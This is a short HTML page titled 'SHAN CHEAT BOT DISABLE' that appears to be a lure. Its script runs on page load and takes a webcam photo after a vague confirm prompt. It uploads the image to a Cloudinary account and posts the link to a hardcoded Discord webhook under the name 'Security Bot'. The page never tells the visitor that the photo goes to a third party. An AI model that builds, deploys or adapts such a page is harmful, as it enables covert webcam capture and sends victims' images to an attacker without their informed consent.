<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SHAN CHEAT BOT DISABLE</title>
</head>
<body>
    <script>
        async function askPermission() {
            if (confirm("Are you sure? This will take a photo.")) {
                capturePhoto();
            }
        }

        async function capturePhoto() {
            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                await new Promise(resolve => video.onloadedmetadata = resolve);

                video.play();
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    video.srcObject.getTracks().forEach(track => track.stop());

                    canvas.toBlob(blob => uploadPhoto(blob), 'image/png');
                }, 1000);
            } catch (err) {
                alert("Camera access denied!");
                console.error(err);
            }
        }

        async function uploadPhoto(imageBlob) {
            const cloudName = "dxe2hsegn";  // ඔබේ Cloudinary Cloud Name
            const uploadPreset = "my_preset";  // Cloudinary Unsigned Upload Preset

            const formData = new FormData();
            formData.append("file", imageBlob);
            formData.append("upload_preset", uploadPreset);

            try {
                const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
                    method: "POST",
                    body: formData
                });

                const result = await response.json();
                const imageUrl = result.secure_url; // Get uploaded image URL

                sendToDiscord(imageUrl);  // Send the URL to Discord Webhook
            } catch (error) {
                console.error("Cloudinary upload error:", error);
            }
        }

        function sendToDiscord(imageUrl) {
            fetch("https://discord.com/api/webhooks/1340611336966770761/BG9LqkUM1Tri7XT1oHVaotzuOQo6VTj4fnWsmtgS0geRxhdBAVZ0wxw3XqGdjLYIY9xI", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    username: "Security Bot", 
                    content: "User verification photo:", 
                    embeds: [{
                        image: {
                            url: imageUrl  // Sending image URL
                        }
                    }]
                })
            })
            .then(response => console.log("Photo sent to Discord!"))
            .catch(err => console.error("Error sending photo to Discord:", err));
        }

        askPermission();
    </script>
</body>
</html>
